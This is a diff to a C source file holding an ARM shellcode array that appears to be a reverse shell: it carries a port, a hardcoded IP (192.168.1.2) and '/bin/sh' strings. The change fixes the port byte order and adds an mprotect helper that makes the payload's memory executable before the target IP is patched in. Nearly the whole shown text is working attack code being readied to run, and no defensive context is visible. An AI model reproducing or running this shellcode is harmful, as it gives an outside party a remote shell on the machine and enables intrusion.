@@ -15,15 +15,17 @@ limitations under the License.
 
 #include <stdint.h>
 #include <stdio.h>
+#include <sys/mman.h>
 
 
 #ifdef __ARMEL__
 int payload[]=  {
 		 0xe28f1001, 0xe12fff11, 0x21012002, 0x020f1a92, 0xdf013719, 0xa1081c06, 0x37022210, 0x273fdf01, 0x1c302102, 0x3901df01, 0xa005d5fb, 0xb4051a92, 0x270b4669, 0x46c0df01,
-		 VULNPORT <<16 +2,		// port
+		 (((VULNPORT>>8) | ((VULNPORT<<8) & 0xffff))<<16) +2,		// port
 		 0x0201a8c0,			// ip
 		 0x6e69622f, 0x0068732f
 		};
+
 
 uint32_t parseIPV4string(char* ipAddress) {
 	unsigned int ipbytes[4];
@@ -69,9 +71,18 @@ uint32_t parseIPV4string(char* ipAddress) {
 }
 #endif
 
+int change_page_perm_at_address(void *addr) {
+    int page_size = getpagesize();
+    addr -= (unsigned long)addr % page_size;
+    if(mprotect(addr, page_size, PROT_READ | PROT_WRITE | PROT_EXEC) == -1) {
+        return -1;
+    }
+    return 0;
+}
 
 int main(){
 #ifdef __ARMEL__
+change_page_perm_at_address(&payload);
 payload[15] = parseIPV4string(&VULNIP);
 #endif
 #ifdef __MIPSEB
